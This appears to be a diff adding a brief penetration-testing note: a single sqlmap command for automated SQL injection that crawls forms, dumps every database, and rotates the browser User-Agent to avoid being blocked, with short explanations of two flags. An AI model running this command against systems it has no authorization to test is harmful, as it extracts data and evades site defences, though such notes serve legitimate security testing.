@@ -1,0 +1,8 @@
+sqlmap -r request.req --batch --level 5 --risk 3 --threads 10 --dbs --dump --forms --crawl=2 --random-agent
+
+------------------------------
+
+
+--forms --crawl=2: Finds other forms on the site to test automatically.
+--random-agent: Prevents being blocked by using a real browser User-Agent.
+
